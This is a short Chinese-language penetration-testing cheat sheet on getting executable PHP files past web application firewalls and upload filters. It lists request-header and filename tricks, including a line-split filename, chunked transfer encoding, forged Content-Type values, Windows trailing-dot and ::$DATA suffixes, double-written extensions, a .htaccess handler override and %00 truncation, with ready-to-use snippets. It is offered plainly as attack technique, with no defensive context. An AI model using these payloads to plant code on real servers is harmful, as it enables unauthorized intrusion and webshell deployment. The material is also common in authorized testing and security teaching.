# fileupload bypass waf

---


名字换行绕过waf（找到真实IP，通过真实IP请求）

```
Content-Disposition: form-data; name="Filedata"; filename="2.p
h
p"
```

chunk绕过waf

```
Transfer-Encoding:chunked
16进制：1-9ABCDEFG
然后将上传内容变成下述的分块传输，从----------websdafasgasjfga-----------开始
A:
xxxxxxxxxx 
8:
xxxxxxxx
```

修改编码方式：（找到真实IP，通过真实IP请求，在请求包中加入以下即可）

```
Accept-Encoding: deflate   或者gzip   # 设置在请求头，对服务端声明可以接受的编码方式
Content-Encoding: deflate  或者gzip   # 设置在响应头，对客户端声明会用哪种编码方式
```






客户端js验证：可以先正常图片上传，然后通过burp抓包改包成可解析的代码如：php即可


服务端验证：

MIME验证绕过

```
上传php但是修改成可允许上传的图片的MIME即可绕过
Content-Type:image/jpeg                # jpg，可以换成png，gif等
Content-Type:image/php                 # 有些代码逻辑是提取该/后面的php为文件后缀
Content-Type:application/octet-stream  # php，可以换成xml、json、pdf等
Content-Type:text/html                 # html，可以换成xml等
```

黑名单绕过

```
适用于黑名单绕过且目标是windows系统
xx.php空格     # 点号后面的空格会自动删除,访问xx.php
xx.PHP        # windows，大小写不敏感     ，访问xx.PHP
xx.php.       # windows文件命名，点号后面没有东西也会删除点，访问xx.php
xx.php..      # 同理，但是过滤一个末尾的点     ，访问xx.php
xx.php::$DATA # windows系统中将::$DATA当成文件流处理，会把::$DATA删除， 访问xx.php
---
过滤某些字符串：双写绕过，如过滤php变成空格，双写php进行嵌套，phphpp
---
.htaccess绕过
    如果没有禁止该文件上传，可以适用，仅限apache，和黑名单没有限制该文件上传
    让同目录下的2.jpg当php解析
    <FilesMatch "2.jpg">
    SetHandler application/x-httpd-php
    </FilesMatch>
```

白名单绕过

```
%00截断
限制：php版本小于5.3.4且php.ini的magic_quotes_gpc为OFF状态

get请求：
    xx.php%00.jpg  # 代码检测后缀是jpg，但是php读到%00进行了截断，结束读取
    xx.php%00/2.jpg  # 同理，在文件路径中也可以

post请求：（需要进行url解码）
    xx.php%00.jpg
    对%00右键/Convert selection/URL/URL-decode

访问xx.php

---
图片马+文件包含 进行白名单绕过
```



